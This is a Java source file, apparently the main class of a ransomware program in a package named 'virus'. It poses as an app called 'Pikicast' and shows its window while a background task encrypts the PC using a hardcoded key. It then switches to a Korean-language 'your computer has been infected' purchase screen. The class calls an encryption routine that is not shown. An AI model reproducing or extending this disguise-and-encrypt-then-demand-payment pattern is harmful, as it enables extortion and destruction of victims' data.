
package com.virus;

import com.sun.deploy.uitoolkit.impl.fx.HostServicesFactory;
import com.sun.javafx.application.HostServicesDelegate;
import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;

public class Main extends Application {
    public static HostServicesDelegate hostServices;
    public static EncryptionController encryptionController;

    public Main() {
        hostServices = HostServicesFactory.getInstance(this);
        encryptionController = new EncryptionController("WelcomeToDimigo!");
    }

    public static void main(String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage stage) throws Exception {
        if (encryptionController.isEncrypted()) {
            System.out.println("[Log] 이미 감염되있는 PC 입니다");
            Scene scene = new Scene(FXMLLoader.load(getClass().getResource("Purchase.fxml")));
            stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
            stage.setResizable(false);
            stage.setScene(scene);
            stage.show();
        } else {
            Parent root1 = FXMLLoader.load(getClass().getResource("MainPage.fxml"));
            Parent root2 = FXMLLoader.load(getClass().getResource("Purchase.fxml"));
            System.out.println("[Log] 감염되지 않은 PC 입니다. Pikicast를 보여줍니다.");
            Scene scene1 = new Scene(root1);
            stage.setTitle("Pikicast");
            stage.setScene(scene1);
            stage.show();

            // 여기 좀 이상한데 못고치겠음
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    encryptionController.encryption();
                    return null;
                }
            };
            task.setOnSucceeded(e -> {
                Scene scene2 = new Scene(root2);
                stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
                stage.setResizable(false);
                stage.setScene(scene2);
                stage.show();
            });
            new Thread(task).start();
        }
    }

    public static void viewWeb(String url) {
        hostServices.showDocument(url);
    }
}
